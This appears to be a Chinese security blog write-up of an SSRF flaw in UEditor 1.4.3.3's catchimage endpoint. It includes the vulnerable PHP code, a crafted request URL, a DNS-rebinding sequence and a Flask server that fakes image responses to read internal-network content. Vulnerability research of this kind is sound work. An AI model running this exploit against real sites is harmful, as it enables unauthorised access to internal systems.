@@ -1,0 +1,126 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>现在都没人收Ueditor的洞了么？都只能赚稿费...</p>
+<h3 data-content="1" id="ac616924cdf01119b840616b683e9499">代码分析</h3>
+<p>一般请求的url如下，其中source为数组，值为图片地址:</p>
+<pre><code>http://lemon.i/code-src/editor/ueditor/php/controller.php?action=catchimage&amp;source[]=https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo_top_86d58ae1.png</code></pre>
+<p>主要跟踪这段代码: <code>/php/Uploader.class.php:173</code></p>
+<pre><code>private function saveRemote()
+{
+    $imgUrl = htmlspecialchars($this-&gt;fileField);
+    $imgUrl = str_replace("&amp;", "&amp;", $imgUrl);
+
+    //http开头验证
+    if (strpos($imgUrl, "http") !== 0) {
+        $this-&gt;stateInfo = $this-&gt;getStateInfo("ERROR_HTTP_LINK");
+        return;
+    }
+
+    preg_match('/(^https*:\/\/[^:\/]+)/', $imgUrl, $matches);
+    $host_with_protocol = count($matches) &gt; 1 ? $matches[1] : '';
+
+    // 判断是否是合法 url
+    if (!filter_var($host_with_protocol, FILTER_VALIDATE_URL)) {
+        $this-&gt;stateInfo = $this-&gt;getStateInfo("INVALID_URL");
+        return;
+    }
+
+    preg_match('/^https*:\/\/(.+)/', $host_with_protocol, $matches);
+    $host_without_protocol = count($matches) &gt; 1 ? $matches[1] : '';
+
+    // 此时提取出来的可能是 ip 也有可能是域名，先获取 ip
+    $ip = gethostbyname($host_without_protocol);
+    // 判断是否是私有 ip
+    if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
+        $this-&gt;stateInfo = $this-&gt;getStateInfo("INVALID_IP");
+        return;
+    }
+
+    //获取请求头并检测死链
+    $heads = get_headers($imgUrl, 1);
+    if (!(stristr($heads[0], "200") &amp;&amp; stristr($heads[0], "OK"))) {
+        $this-&gt;stateInfo = $this-&gt;getStateInfo("ERROR_DEAD_LINK");
+        return;
+    }
+    //格式验证(扩展名验证和Content-Type验证)
+    $fileType = strtolower(strrchr($imgUrl, '.'));
+    if (!in_array($fileType, $this-&gt;config['allowFiles']) || !isset($heads['Content-Type']) || !stristr($heads['Content-Type'], "image")) {
+        $this-&gt;stateInfo = $this-&gt;getStateInfo("ERROR_HTTP_CONTENTTYPE");
+        return;
+    }
+
+    //打开输出缓冲区并获取远程图片
+    ob_start();
+    $context = stream_context_create(
+        array('http' =&gt; array(
+            'follow_location' =&gt; false // don't follow redirects
+        ))
+    );
+    readfile($imgUrl, false, $context);
+    $img = ob_get_contents();
+    ob_end_clean();
+    ...省略   
+}</code></pre>
+<p>整个流程大概如下:<br/>
+1、判断是否是合法http的url地址<br/>
+2、利用gethostbyname来解析判断是否是内网IP<br/>
+3、利用get_headers进行http请求，来判断请求的图片资源是否正确，比如状态码为200、响应content-type是否为image (SSRF漏洞触发处)<br/>
+4、最终用readfile来进行最后的资源获取，来获取图片内容</p>
+<p>所以在利用DNS重绑定时候，我们可以这样做<br/>
+第一次请求 -&gt; 外网ip<br/>
+第二次请求 -&gt; 内网ip<br/>
+第三次请求 -&gt; 内网ip</p>
+<h3 data-content="1" id="e0a9e81ce883e96a4d13c7bac696d100">1.4.3.3 DNS重绑定利用过程</h3>
+<p>其实单纯的第二次就已经有了HTTP请求，所以可以很容易的进行一些攻击.</p>
+<pre><code>lemon.i/code-src/editor/ueditor/php/controller.php?action=catchimage&amp;source[]=http://my.ip/?aaa=1%26logo.png</code></pre>
+<p>其中my.ip设置了重绑定<br/>
+第一次dns请求是调用了gethostbyname函数 -&gt; 外网ip<br/>
+第二次dns请求是调用了get_headers函数 -&gt; 内网ip</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181029122213-35cbfb06-db32-1.jpg"/></p>
+<p>其中返回内容state为<code>链接contentType不正确</code>，表示请求成功了!<br/>
+如果返回为<code>非法 IP</code>则表示DNS重绑定时候第一次是为内网IP，这时需要调整一下绑定顺序.</p>
+<hr/>
+<p>但是会剩一个问题就是: 能不能获取到SSRF请求后的回显内容!<br/>
+第三个请求便可以做到，因为会将请求的内容保存为图片，我们获取图片内容即可.</p>
+<p>但是得先把第二次请求限制绕过</p>
+<pre><code>!(stristr($heads[0], "200") &amp;&amp; stristr($heads[0], "OK"))
+
+!in_array($fileType, $this-&gt;config['allowFiles']) || !isset($heads['Content-Type']) || !stristr($heads['Content-Type'], "image")</code></pre>
+<p>这两个条件语句也就是限定了请求得需要为200状态、并且响应头的content-type是image<br/>
+所以第二次请求最好是我们可控的服务器，这样才能绕过它的限制.</p>
+<pre><code>所以在利用DNS重绑定时候，我们可以这样做
+第一次请求 -&gt; 外网ip
+第二次请求 -&gt; 外网ip (外网server)
+第三次请求 -&gt; 内网ip (内网攻击地址)</code></pre>
+<p>第二次请求的外网server需要定制一下，也就任何请求都返回200，并且content-type为image</p>
+<pre><code>from flask import Flask, Response
+from werkzeug.routing import BaseConverter
+
+class Regex_url(BaseConverter):
+    def __init__(self,url_map,*args):
+        super(Regex_url,self).__init__(url_map)
+        self.regex = args[0]
+
+app = Flask(__name__)
+app.url_map.converters['re'] = Regex_url
+
+@app.route('/&lt;re(".*?"):tmp&gt;')
+def test(tmp):
+    image = 'Test'
+    #image = file("demo.jpg")
+    resp = Response(image, mimetype="image/jpeg")
+    return resp
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=80)</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181029122233-41e21ef2-db32-1.jpg"/></p>
+<hr/>
+<p>上面的都是一些理论的说明，事实上，有些DNS会存在缓存问题，导致出现出现结果很不稳定。</p>
+<p>第一步: 搭建后外网的server，左边的为第二次请求(外网)，右边为第三次请求(内网)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181029122248-4ab157a0-db32-1.jpg"/></p>
+<p>第二步: 进行请求，其中网址是有dns重绑定<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181029122304-548f9b6a-db32-1.jpg"/></p>
+<p>第三步: 可以根据返回的图片地址，请求后便可以获取到内网web的ssrf的响应内容<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181029122317-5c0213d2-db32-1.jpg"/></p>
+</div>
+</div>
